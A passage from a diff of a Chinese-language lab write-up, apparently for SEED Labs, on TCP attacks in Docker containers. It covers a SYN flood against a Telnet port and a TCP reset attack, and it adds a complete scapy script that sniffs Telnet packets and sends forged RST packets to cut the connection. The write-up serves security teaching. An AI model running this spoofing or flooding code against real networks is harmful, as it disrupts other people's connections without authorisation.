+					&lt;td&gt;Telnet 服务端，攻击者的最终攻击目标&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;启动实验前先清理容器环境，防止被之前的网络配置干扰&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -41,7 +553,7 @@
 &lt;/div&gt;&lt;blockquote&gt;
 &lt;p&gt;遇到问题：报错&lt;code&gt;Error response from daemon: Conflict. The container name &amp;quot;/victim-10.9.0.5&amp;quot; is already in use by container &amp;quot;fd7c256895debaee38837cb83046b960c835ac339d2615eeb954516b83a15eda&amp;quot;. You have to remove (or rename) that container to be able to reuse that name.&lt;/code&gt;&lt;/p&gt;
 &lt;img src=&#34;2.png&#34; style=&#34;width: 90%;&#34; /&gt;
-&lt;p&gt;这是因为之前的容器没有停止，而上面的清除命令只会清理无用的网络和停止的容器，最终导致旧容器没有被清理，开启新容器的时候命名冲突。删除旧容器即可&lt;/p&gt;
+&lt;p&gt;这是因为之前的容器没有停止，而上面的清除命令只会清理无用的网络和停止的容器，导致旧容器没有被清理，开启新容器的时候命名冲突。删除旧容器即可&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -51,33 +563,6 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;/blockquote&gt;
-&lt;p&gt;网络结构包括受害者、攻击者、普通用户&lt;/p&gt;
-&lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;节点&lt;/th&gt;
-          &lt;th&gt;IP 地址&lt;/th&gt;
-          &lt;th&gt;作用&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;攻击者&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;10.9.0.1&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;发送伪造 TCP 报文进行攻击&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;受害者&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;10.9.0.5&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;被攻击的 Telnet 客户端&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;普通用户&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;10.9.0.6&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;Telnet 服务端，会话劫持和反向 Shell 的目标&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
 &lt;p&gt;打开三个终端分别进入对应的容器&lt;/p&gt;
 &lt;p&gt;攻击者：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -97,7 +582,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker exec -it victim-10.9.0.5 /bin/bash
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;普通用户：&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;用户：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -110,7 +595,7 @@
 &lt;/h2&gt;&lt;blockquote&gt;
 &lt;p&gt;正常的TCP通信是客户端向服务器发送 SYN，服务器回复 SYN-ACK，然后等待客户端发送 ACK ，收到就连接成功，这三次发送也就是三次握手&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;但如果攻击者一直发送大量 SYN 包而且不发送ACK完成握手，服务器就会保留大量半连接记录，数量多到半连接队列被占满时，如果正常用户需要连接服务器，就会因为服务器资源被占用导致没有办法连接&lt;/p&gt;
+&lt;p&gt;但如果攻击者一直发送大量 SYN 包而且不发送ACK完成握手，服务器就会保留大量半连接记录，数量多到半连接队列被占满时，这时如果正常用户需要连接服务器，就会因为服务器资源被占用导致没有办法连接&lt;/p&gt;
 &lt;h3 id=&#34;攻击者&#34;&gt;攻击者
 &lt;/h3&gt;&lt;p&gt;进入攻击者容器，安装编译环境&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -134,7 +619,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gcc synflood.c -o synflood
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;向受害者的 Telnet 端口发送大量 SYN 包&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;向受害者的23端口发送大量 SYN 包&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -144,7 +629,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;验证&#34;&gt;验证
-&lt;/h3&gt;&lt;p&gt;在普通用户容器里用telnet连接受害者，可以看到一直卡在尝试阶段，无法成功连接&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;在用户容器里用Telnet连接受害者，可以看到一直卡在尝试阶段，无法成功连接&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -163,15 +648,14 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -nat
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;img src=&#34;5.png&#34; style=&#34;width: 90%;&#34; /&gt;
-&lt;p&gt;&lt;code&gt;SYN_RECV&lt;/code&gt; 表示服务器收到了 SYN 并回复 SYN-ACK，但还没有收到客户端的 ACK。大量这样的状态说明服务器半连接队列被占用，而telnet无法连接说明队列已经被占满了，导致正常请求进不去，这就是 SYN 洪泛攻击的效果&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;5.png&#34; style=&#34;width: 100%;&#34; /&gt;&lt;code&gt;SYN_RECV&lt;/code&gt; 是服务器收到了 SYN ，回复 SYN-ACK，但还没有收到客户端的 ACK。出现大量这样的状态说明服务器半连接队列被占用，而Telnet无法连接说明队列已经被占满了，导致正常请求被丢包。这就是 SYN 洪泛攻击的效果&lt;/p&gt;
 &lt;h2 id=&#34;tcp-重置攻击&#34;&gt;TCP 重置攻击
 &lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;TCP 连接建立后，只要通信一方收到看起来合法的 RST 包，就会将连接关闭&lt;/p&gt;
+&lt;p&gt;TCP 连接建立后，只要连接的其中一方收到看起来合法的 RST 包，就会将连接关闭&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;攻击者如果能伪造出源 IP、目标 IP、端口和序列号都和当前连接状态相同的 RST 报文，就能强行中断受害者与用户的连接&lt;/p&gt;
-&lt;h3 id=&#34;建立连接&#34;&gt;建立连接
-&lt;/h3&gt;&lt;p&gt;在受害者容器中连接普通用户容器&lt;/p&gt;
+&lt;p&gt;攻击者如果能伪造出源 IP、目标 IP、端口和序列号都和当前连接状态相同的 RST 报文，就能直接断开受害者与用户的连接&lt;/p&gt;
+&lt;h3 id=&#34;受害者&#34;&gt;受害者
+&lt;/h3&gt;&lt;p&gt;受害者连接用户，账号是 &lt;code&gt;seed&lt;/code&gt;，密码是 &lt;code&gt;dees&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -180,21 +664,65 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;telnet 10.9.0.6
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;img src=&#34;6.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;/div&gt;&lt;img src=&#34;6.png&#34; style=&#34;width: 90%;&#34; /&gt;
 &lt;h3 id=&#34;攻击者-1&#34;&gt;攻击者
-&lt;/h3&gt;&lt;p&gt;这里的脚本&lt;/p&gt;
-&lt;p&gt;输入&lt;code&gt;ip addr&lt;/code&gt;确认攻击者容器的网卡名，找到 &lt;code&gt;10.9.0.1&lt;/code&gt; 对应的网卡，我这里是叫&lt;code&gt;br-4e1873a46169&lt;/code&gt;&lt;/p&gt;
-&lt;img src=&#34;3.png&#34; style=&#34;width: 90%;&#34; /&gt;
-&lt;p&gt;打开 &lt;code&gt;reset_auto.py&lt;/code&gt; 和 &lt;code&gt;hijacking_auto.py&lt;/code&gt;，把代码末尾 &lt;code&gt;sniff()&lt;/code&gt; 函数中的 &lt;code&gt;iface&lt;/code&gt; 改成实际网卡名，这里的网卡名必须和本机环境一致，否则脚本可能运行正常，但实际抓不到目标流量&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;输入&lt;code&gt;ip addr&lt;/code&gt;确认攻击者容器的网卡名，找到 &lt;code&gt;10.9.0.1&lt;/code&gt; 对应的网卡，我这里是叫&lt;code&gt;br-4e1873a46169&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;3.png&#34; style=&#34;width: 100%;&#34; /&gt;
+&lt;p&gt;打开攻击脚本&lt;code&gt;reset_auto.py&lt;/code&gt;，把代码末尾 &lt;code&gt;sniff()&lt;/code&gt; 函数中的 &lt;code&gt;iface&lt;/code&gt; 改成实际的网卡名，否则脚本正常运行，但实际上抓不到目标的通信流量&lt;/p&gt;
+&lt;p&gt;脚本监听用户 &lt;code&gt;10.9.0.6&lt;/code&gt; 发给受害者 &lt;code&gt;10.9.0.5&lt;/code&gt; 的 Telnet 包。抓到包后读取原包的端口和确认号，再伪造一个看起来像受害者发出的 RST 包。&lt;code&gt;flags=&amp;quot;R&amp;quot;&lt;/code&gt; 也就是重置连接，&lt;code&gt;seq=old_tcp.ack&lt;/code&gt; 是为了让伪造包的序列号合法。用户收到这个 RST 包后会认为连接被另一边关闭&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sniff(iface=&amp;#39;br-4e1873a46169&amp;#39;, filter=f, prn=spoof_pkt)
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;spoof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;old_ip&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;R&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;seq&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ls&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;myFilter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tcp and src host &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; and dst host &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; and src port 23&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Running RESET attack ...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Filter used: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Spoofing RESET packets from Client (&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;) to Server (&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sniff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iface&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;br-4e1873a46169&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;spoof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;在攻击者容器中运行重置攻击脚本&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;在攻击者容器中运行攻击脚本，这里可以看到伪造报文的结构&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -203,18 +731,14 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 reset_auto.py 10.9.0.5 10.9.0.6
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
